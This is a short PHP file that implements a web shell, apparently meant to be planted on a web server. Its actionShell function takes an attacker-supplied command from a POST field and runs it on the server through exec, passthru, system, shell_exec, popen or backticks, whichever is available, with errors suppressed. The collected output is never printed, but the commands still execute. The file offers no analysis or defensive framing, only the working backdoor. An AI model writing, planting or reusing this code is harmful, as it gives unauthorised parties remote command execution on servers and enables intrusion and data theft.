<?php
function actionShell(){
        $in=$_POST['cmd']." 2>&1";
        $m = $_POST['m'];
        switch($m){
            case 'exec':
            if (function_exists('exec')) {
                @exec($in,$out);
                $out = @join("\n",$out);
            }    
            break;
            case 'passthru':
            if (function_exists('passthru')) {
                ob_start();
                @passthru($in);
                $out = ob_get_clean();
            }    
            break;
            case 'system':
            if (function_exists('system')) {
                ob_start();
                @system($in);
                $out = ob_get_clean();
            }    
            break;
            case 'shell_exec':
            if (function_exists('shell_exec')) {
                $out = shell_exec($in);
            }    
            break;
            case 'popen':
            if (is_resource($f = @popen($in,"r"))) {
                $out = "";
                while(!@feof($f))
                    $out .= fread($f,1024);
                pclose($f);
            }    
            break;
            case 'backquote':
                $out=`$in`;
        }        
    
}

actionShell();
?>